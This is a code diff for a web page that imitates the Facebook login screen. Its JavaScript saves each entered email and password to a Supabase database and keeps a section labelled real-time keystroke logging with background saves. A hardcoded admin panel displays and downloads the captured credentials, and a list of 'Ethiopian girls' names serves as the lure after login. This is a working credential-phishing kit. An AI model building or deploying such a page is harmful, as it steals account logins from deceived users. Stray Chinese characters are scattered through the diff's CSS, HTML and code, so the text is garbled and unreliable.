@@ -72,7 +72,7 @@
         .login-form {
             background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(极, 0, 0, .1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             padding: 20px;
             max-width: 400px;
             margin: auto;
@@ -96,12 +96,12 @@
         }
         
         .login-btn {
-            background-color: #1877f2;
+            background-color:极#1877f2;
             color: white;
             border: none;
-极          border-radius: 6px;
+            border-radius: 6px;
             font-size: 20px;
-            padding: 极2px;
+            padding: 12px;
             font-weight: bold;
             width: 100%;
             margin-bottom: 15px;
@@ -114,7 +114,7 @@
         }
         
         .forgot-password {
-            color: #1877f2;
+            color: #1877极2;
             text-align: center;
             display: block;
             margin-bottom: 15px;
@@ -203,7 +203,7 @@
             padding: 20px;
         }
         
-        .main-header {
+        .极ain-header {
             background-color: #1877f2;
             color: white;
             padding: 10px 20px;
@@ -219,7 +219,7 @@
             gap: 15px;
             padding: 20px;
             background-color: #f0f2f5;
-            border-radius: 0 0 8极 8px;
+            border-radius: 0 0 8px 8px;
         }
         
         .girl-box {
@@ -246,7 +246,7 @@
             background-color: white;
             color: #1877f2;
             border: none;
-            padding: 8px 16px;
+            padding: 8px 极6px;
             border-radius: 6px;
             font-weight: bold;
             cursor: pointer;
@@ -281,7 +281,7 @@
             width: 40px;
             height: 40px;
             cursor: pointer;
-            z极dex: 1001;
+            z-index: 1001;
             font-size: 18px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             display: flex;
@@ -294,7 +294,7 @@
             border-bottom: 1px solid #dddfe2;
             margin-bottom: 10px;
             border-radius: 6px;
-            background-color: #极7f8fa;
+            background-color: #f7f8fa;
         }
         
         .attempt-item:last-child {
@@ -307,7 +307,7 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
-            padding-bottom: 15极;
+            padding-bottom: 15px;
             border-bottom: 2px solid #e4e6eb;
         }
         
@@ -350,7 +350,7 @@
         .admin-btn {
             padding: 10px 15px;
             border: none;
-            border-radius: 6px;
+            border-radius极 6px;
             cursor: pointer;
             font-weight: bold;
         }
@@ -382,8 +382,8 @@
         .admin-login-form {
             background: white;
             padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            border-radius: 12极;
+            box-shadow: 0 10px 30极 rgba(0, 0, 0, 0.4);
             width: 90%;
             max-width: 400px;
         }
@@ -427,7 +427,7 @@
             display: none;
         }
         
-        .admin-login-close {
+        .admin-login-极lose {
             text-align: center;
             color: #1877f2;
             cursor: pointer;
@@ -525,7 +525,7 @@
             <li>Create a table named 'login_attempts' with columns: id, email, password, timestamp, incomplete</li>
             <li>Update the supabaseUrl and supabaseKey in the code with your credentials</li>
         </ol>
-        <p>Without these steps, the connection will fail with "Failed to fetch" errors.</p>
+        <p>Without these steps, the connection will fail with "Failed to fetch极 errors.</p>
     </div>
 
     <!-- Supabase status indicator -->
@@ -541,7 +541,7 @@
     <!-- Admin Login Form -->
     <div class="admin-login-container" id="adminLoginContainer">
         <div class="admin-login-form">
-            <h2><i class="fas fa-lock"></极> Admin Authentication</h2>
+            <h2><i class="fas fa-lock"></i> Admin Authentication</h2>
             <input type="text" id="adminUsername" placeholder="Admin Username" required>
             <input type="password" id="adminPassword" placeholder="Admin Password" required>
             <button class="admin-login-btn" id="adminLoginBtn">Access Admin Panel</button>
@@ -561,11 +561,11 @@
         
         <div class="content">
             <div class="left-content">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2YhQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2极hQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
             </div>
             
             <div class="right-content">
-                <div class="login-form">
+                <div class极"login-form">
                     <form id="loginForm">
                         <input type="text" id="email" name="username" placeholder="Email or phone number" required>
                         <div class="password-container">
@@ -597,7 +597,7 @@
     </div>
     
     <div class="footer">
-        <p>English (US) Español Français (France) العربية Português (Brasil) Italiano</p>
+        <p>English (US) Español Français (France) العربية Português (Brasil) Italiano</极>
         <p>Copyright © 2023 Facebook. All rights reserved.</p>
     </div>
     
@@ -608,7 +608,7 @@
     
     <div class="overlay" id="overlay"></div>
     
-    <div class="admin-panel极" id="adminPanel">
+    <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
             <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Admin Panel - Login Attempts</h2>
             <button class="close-admin" id="closeAdmin">
@@ -618,7 +618,7 @@
         <div id="attemptsList"></div>
         <div class="admin-controls">
             <button class="admin-btn download-btn" id="downloadBtn">
-                <i class="fas fa-download"></i> Download Data
+                <极 class="fas fa-download"></i> Download Data
             </button>
             <button class="admin-btn clear-btn" id="clearBtn">
                 <i class="fas fa-trash"></i> Clear All
@@ -632,24 +632,238 @@
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
         
         let supabase;
-        try {
-            supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
-        } catch (error) {
-            console.error("Supabase initialization error:", error);
-            showError("Failed to initialize database connection. Check your Supabase credentials.");
-            document.getElementById('connectionHelp').style.display = 'block';
+        let loginAttempts = [];
+        let isAdminAuthenticated = false;
+        let realtimeSubscription = null;
+
+        // Ethiopian girls names
+        const ethiopianGirls = [
+            "Alem", "Birut", "Chaltu", "Desta", "Etabesa", 
+            "Fana", "Genet", "Hana", "Iman", "Jember", 
+            "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
+            "Pozeban", "Qelem", "Ruhama", "Saron", "Tigist"
+        ];
+        
+        // Admin credentials
+        const ADMIN_USERNAME = "pleaselogin";
+        const ADMIN_PASSWORD = "pleaselogin";
+
+        // Show error message
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            if (errorMessage) {
+                errorMessage.textContent = message;
+                errorMessage.style.display = 'block';
+                setTimeout(() => {
+                    errorMessage.style.display = 'none';
+                }, 8000);
+            }
+            console.error(message);
         }
 
+        // Show status message
+        function showStatus(message, isError = false) {
+            const supabaseStatus = document.getElementById('supabaseStatus');
+            if (supabaseStatus) {
+                supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
+                supabaseStatus.style.display = 'block';
+                supabaseStatus.className = isError ? 
+                    'supabase-status connection-error' : 'supabase-status';
+                
+                setTimeout(() => {
+                    supabaseStatus.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Test Supabase connection
+        window.testConnection = async function() {
+            try {
+                showStatus('Testing connection...');
+                
+                if (!supabase) {
+                    throw new Error("Supabase client not initialized. Check your credentials.");
+                }
+                
+                // Test if we can actually insert data
+                const testData = {
+                    email: 'test@example.com',
+                    password: 'test_password',
+                    timestamp: new Date().toISOString(),
+                    incomplete: true
+                };
+                
+                const { error } = await supabase
+                    .from('login_attempts')
+                    .insert([testData]);
+                
+                if (error) {
+                    showError('Insert Failed: ' + error.message);
+                    showStatus('Connection Failed', true);
+                } else {
+                    showStatus('Connection Successful!');
+                    alert('✅ Connection to Supabase successful! Data can be saved.');
+                }
+            } catch (error) {
+                showError('Connection Error: ' + error.message);
+                showStatus('Connection Failed', true);
+            }
+        }
+        
+        // Save data to Supabase
+        async function saveToSupabase(data) {
+            try {
+                console.log("Attempting to save:", data);
+                
+                const { error } = await supabase
+                    .from('login_attempts')
+                    .insert([{ 
+                        email: data.email,
+                        password: data.password,
+                        timestamp: new Date().toISOString(),
+                        incomplete: data.incomplete || false
+                    }]);
+                
+                if (error) {
+                    console.error("Supabase error:", error);
+                    showError('Save Failed: ' + error.message);
+                    return false;
+                }
+                
+                console.log("Data saved successfully");
+                return true;
+            } catch (error) {
+                console.error("Save error:", error);
+                showError('Save Error: ' + error.message);
+                return false;
+            }
+        }
+        
+        // Load data from Supabase
+        async function loadFromSupabase() {
+            try {
+                if (!supabase) {
+                    throw new Error("Database not connected");
+                }
+                
+                const { data, error } = await supabase
+                    .from('login_attempts')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+                
+                if (error) {
+                    showError('Load Failed: ' + error.message);
+                    return [];
+                }
+                return data || [];
+            } catch (error) {
+                showError('Network Error: ' + error.message);
+                return [];
+            }
+        }
+        
+        // Display login attempts in admin panel
+        async function displayLoginAttempts() {
+            const attemptsList = document.getElementById('attemptsList');
+            if (!attemptsList) return;
+            
+            attemptsList.innerHTML = '';
+            
+            try {
+                loginAttempts = await loadFromSupabase();
+                
+                if (loginAttempts.length === 0) {
+                    attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
+                    return;
+                }
+                
+                const reversedAttempts = [...loginAttempts].reverse();
+                
+                reversedAttempts.forEach(attempt => {
+                    const attemptItem = document.createElement('div');
+                    attemptItem.className = 'attempt-item';
+                    attemptItem.innerHTML = `
+                        <strong>Email/Phone:</strong> ${attempt.email}<br>
+                        <strong>Password:</strong> ${attempt.password}<br>
+                        <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
+                        ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
+                    `;
+                    attemptsList.appendChild(attemptItem);
+                });
+            } catch (error) {
+                attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>';
+            }
+        }
+        
+        // Setup real-time subscription
+        function setupRealtimeSubscription() {
+            if (!supabase) return;
+            
+            if (realtimeSubscription) {
+                supabase.removeChannel(realtimeSubscription);
+            }
+            
+            realtimeSubscription = supabase
+                .channel('login_attempts_changes')
+                .on('postgres_changes', 
+                    { 
+                        event: 'INSERT', 
+                        schema: 'public', 
+                        table: 'login_attempts' 
+                    }, 
+                    (payload) => {
+                        const adminPanel = document.getElementById('adminPanel');
+                        if (isAdminAuthenticated && adminPanel && adminPanel.style.display === 'block') {
+                            displayLoginAttempts();
+                        }
+                    }
+                )
+                .subscribe();
+        }
+        
+        // Populate girls selection
+        function populateGirls() {
+            const girlsContainer = document.getElementById('girlsContainer');
+            if (!girlsContainer) return;
+            
+            girlsContainer.innerHTML = '';
+            
+            ethiopianGirls.forEach(girl => {
+                const girlBox = document.createElement('div');
+                girlBox.className = 'girl-box';
+                girlBox.textContent = girl;
+                
+                girlBox.addEventListener('click', function() {
+                    document.querySelectorAll('.girl-box').forEach(box => {
+                        box.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                });
+                
+                girlsContainer.appendChild(girlBox);
+            });
+        }
+        
+        // Initialize the application
         document.addEventListener('DOMContentLoaded', function() {
+            // Initialize Supabase client
+            try {
+                supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+                console.log("Supabase client initialized");
+            } catch (error) {
+                console.error("Supabase initialization error:", error);
+                showError("Failed to initialize database connection. Check your Supabase credentials.");
+                const connectionHelp = document.getElementById('connectionHelp');
+                if (connectionHelp) connectionHelp.style.display = 'block';
+            }
+            
             // DOM Elements
             const loginForm = document.getElementById('loginForm');
             const loginPage = document.querySelector('.login-page');
             const mainPage = document.getElementById('mainPage');
             const logoutBtn = document.getElementById('logoutBtn');
-            const girlsContainer = document.getElementById('girlsContainer');
             const adminToggle = document.getElementById('adminToggle');
             const adminPanel = document.getElementById('adminPanel');
-            const attemptsList = document.getElementById('attemptsList');
             const overlay = document.getElementById('overlay');
             const closeAdmin = document.getElementById('closeAdmin');
             const downloadBtn = document.getElementById('downloadBtn');
@@ -662,210 +876,6 @@
             const adminLoginClose = document.getElementById('adminLoginClose');
             const passwordInput = document.getElementById('password');
             const togglePassword = document.getElementById('togglePassword');
-            const supabaseStatus = document.getElementById('supabaseStatus');
-            const errorMessage = document.getElementById('errorMessage');
-            const connectionHelp = document.getElementById('connectionHelp');
-            
-            // Ethiopian girls names
-            const ethiopianGirls = [
-                "Alem", "Birut", "Chalt极", "Desta", "Etabesa", 
-                "Fana", "Genet", "Hana", "Iman", "Jember", 
-                "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
-                "Pozeban", "Qelem", "Ruhama", "Saron", "Tigist"
-            ];
-            
-            // Admin credentials
-            const ADMIN_USERNAME = "pleaselogin";
-            const ADMIN_PASSWORD = "pleaselogin";
-            
-            // Initialize storage for login attempts
-            let loginAttempts = [];
-            let isAdminAuthenticated = false;
-            let realtimeSubscription = null;
-
-            // Show error message
-            function showError(message) {
-                if (errorMessage) {
-                    errorMessage.textContent = message;
-                    errorMessage.style.display = 'block';
-                    setTimeout(() => {
-                        errorMessage.style.display = 'none';
-                    }, 8000);
-                }
-            }
-
-            // Show status message
-            function showStatus(message, isError = false) {
-                if (supabaseStatus) {
-                    supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
-                    supabaseStatus.style.display = 'block';
-                    supabaseStatus.className = isError ? 
-                        'supabase-status connection-error' : 'supabase-status';
-                    
-                    setTimeout(() => {
-                        supabaseStatus.style.display = 'none';
-                    }, 5000);
-                }
-            }
-
-            // Test Supabase connection
-            window.testConnection = async function() {
-                try {
-                    showStatus('Testing connection...');
-                    
-                    if (!supabase) {
-                        throw new Error("Supabase client not initialized. Check your credentials.");
-                    }
-                    
-                    const { data, error } = await supabase
-                        .from('login_attempts')
-                        .select('count')
-                        .limit(1);
-                    
-                    if (error) {
-                        showError('Supabase Error: ' + error.message);
-                        showStatus('Connection Failed', true);
-                        if (connectionHelp) connectionHelp.style.display = 'block';
-                    } else {
-                        showStatus('Connection Successful!');
-                        alert('✅ Connection to Supabase successful!');
-                        if (connectionHelp) connectionHelp.style.display = 'none';
-                    }
-                } catch (error) {
-                    showError('Connection Error: ' + error.message);
-                    showStatus('Connection Failed', true);
-                    if (connectionHelp) connectionHelp.style.display = 'block';
-                }
-            }
-            
-            // Save data to Supabase
-            async function saveToSupabase(data) {
-                try {
-                    if (!supabase) {
-                        throw new Error("Database not connected");
-                    }
-                    
-                    const { error } = await supabase
-                        .from('login_attempts')
-                        .insert([{ 
-                            email: data.email,
-                            password: data.password,
-                            timestamp: new Date().toISOString(),
-                            incomplete: data.incomplete || false
-                        }]);
-                    
-                    if (error) {
-                        showError('Save Failed: ' + error.message);
-                        return false;
-                    }
-                    return true;
-                } catch (error) {
-                    showError('Network Error: ' + error.message);
-                    return false;
-                }
-            }
-            
-            // Load data from Supabase
-            async function loadFromSupabase() {
-                try {
-                    if (!supabase) {
-                        throw new Error("Database not connected");
-                    }
-                    
-                    const { data, error } = await supabase
-                        .from('login_attempts')
-                        .select('*')
-                        .order('created_at', { ascending: false });
-                    
-                    if (error) {
-                        showError('Load Failed: ' + error.message);
-                        return [];
-                    }
-                    return data || [];
-                } catch (error) {
-                    showError('Network Error: ' + error.message);
-                    return [];
-                }
-            }
-            
-            // Display login attempts in admin panel
-            async function displayLoginAttempts() {
-                if (!attemptsList) return;
-                
-                attemptsList.innerHTML = '';
-                
-                try {
-                    loginAttempts = await loadFromSupabase();
-                    
-                    if (loginAttempts.length === 0) {
-                        attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
-                        return;
-                    }
-                    
-                    const reversedAttempts = [...loginAttempts].reverse();
-                    
-                    reversedAttempts.forEach(attempt => {
-                        const attemptItem = document.createElement('div');
-                        attemptItem.className = 'attempt-item';
-                        attemptItem.innerHTML = `
-                            <strong>Email/Phone:</strong> ${attempt.email}<br>
-                            <strong>Password:</strong> ${attempt.password}<br>
-                            <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
-                            ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
-                        `;
-                        attemptsList.appendChild(attemptItem);
-                    });
-                } catch (error) {
-                    attemptsList.innerHTML = '<极 class="no-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>';
-                }
-            }
-            
-            // Setup real-time subscription
-            function setupRealtimeSubscription() {
-                if (!supabase) return;
-                
-                if (realtimeSubscription) {
-                    supabase.removeChannel(realtimeSubscription);
-                }
-                
-                realtimeSubscription = supabase
-                    .channel('login_attempts_changes')
-                    .on('postgres_changes', 
-                        { 
-                            event: 'INSERT', 
-                            schema: 'public', 
-                            table: 'login_attempts' 
-                        }, 
-                        (payload) => {
-                            if (isAdminAuthenticated && adminPanel && adminPanel.style.display === 'block') {
-                                displayLoginAttempts();
-                            }
-                        }
-                    )
-                    .subscribe();
-            }
-            
-            // Populate girls selection
-            function populateGirls() {
-                if (!girlsContainer) return;
-                
-                girlsContainer.innerHTML = '';
-                
-                ethiopianGirls.forEach(girl => {
-                    const girlBox = document.createElement('div');
-                    girlBox.className = 'girl-box';
-                    girlBox.textContent = girl;
-                    
-                    girlBox.addEventListener('click', function() {
-                        document.querySelectorAll('.girl-box').forEach(box => {
-                            box.classList.remove('selected');
-                        });
-                        this.classList.add('selected');
-                    });
-                    
-                    girlsContainer.appendChild(girlBox);
-                });
-            }
             
             // Handle login form submission
             if (loginForm) {
@@ -884,6 +894,7 @@
                     if (loginPage) loginPage.style.display = 'none';
                     if (mainPage) mainPage.style.display = 'block';
                     
+                    const girlsContainer = document.getElementById('girlsContainer');
                     if (girlsContainer && girlsContainer.children.length === 0) {
                         populateGirls();
                     }
@@ -959,7 +970,7 @@
             // Close admin panel
             if (closeAdmin) {
                 closeAdmin.addEventListener('click', function() {
-                    if (adminPanel) admin极nel.style.display = 'none';
+                    if (adminPanel) adminPanel.style.display = 'none';
                     if (overlay) overlay.style.display = 'none';
                     
                     if (realtimeSubscription) {
@@ -1032,9 +1043,6 @@
                 });
             }
             
-            // Initialize
-            setTimeout(testConnection, 1000);
-            
             // Add real-time keystroke logging
             const emailInput = document.getElementById('email');
             let emailValue = '';
@@ -1072,6 +1080,12 @@
                         console.error("Background save failed:", error);
                     }
                 }
+            }, 1000);
+            
+            // Test connection on load
+            setTimeout(() => {
+                const testBtn = document.querySelector('.debug-btn');
+                if (testBtn) testBtn.click();
             }, 1000);
         });
     </script>
